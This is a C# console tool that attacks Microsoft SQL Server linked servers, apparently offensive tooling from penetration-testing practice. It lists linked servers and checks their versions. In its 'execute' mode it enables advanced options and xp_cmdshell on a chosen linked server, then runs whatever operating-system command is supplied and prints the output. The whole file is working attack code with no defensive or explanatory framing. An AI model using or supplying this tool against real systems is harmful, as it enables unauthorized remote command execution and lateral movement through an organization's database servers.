using System;
using System.Data.SqlClient;
namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                String sqlServer = args[0];
                String database = args[1];

                String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
                SqlConnection con = new SqlConnection(conString);

                try
                {
                    con.Open();
                    Console.WriteLine("Auth success!");
                }
                catch
                {
                    Console.WriteLine("Auth failed");
                    Environment.Exit(0);
                }

                if (args[2] == "enumerate")
                {
                    String execCmd = "EXEC sp_linkedservers;";

                    SqlCommand command = new SqlCommand(execCmd, con);
                    SqlDataReader reader = command.ExecuteReader();

                    while (reader.Read())
                    {
                        Console.WriteLine("Linked SQL server: " + reader[0]);
                    }
                    reader.Close();
                }

                else if (args[2] == "verify")
                {
                    String execCmd = "select version from openquery(\"" + args[3] + "\", 'select @@version as version');";

                    SqlCommand command = new SqlCommand(execCmd, con);
                    SqlDataReader reader = command.ExecuteReader();

                    reader.Read();
                    Console.WriteLine("Linked SQL server version: " + reader[0]);
                    reader.Close();
                }

                else if (args[2] == "execute")
                {
                    String enableadvoptions = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + args[3];
                    String enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + args[3];
                    String execmd = "EXEC ('xp_cmdshell ''" + args[4] + "'';') AT " + args[3];

                    SqlCommand command = new SqlCommand(enableadvoptions, con);
                    SqlDataReader reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(enablexpcmdshell, con);
                    reader = command.ExecuteReader();
                    reader.Close();


                    command = new SqlCommand(execmd, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("Result of command is: " + reader[0]);
                    reader.Close();
                }

                con.Close();
            }
            catch
            {
                Console.WriteLine("Invalid Argument!");

            }
        }
    }
}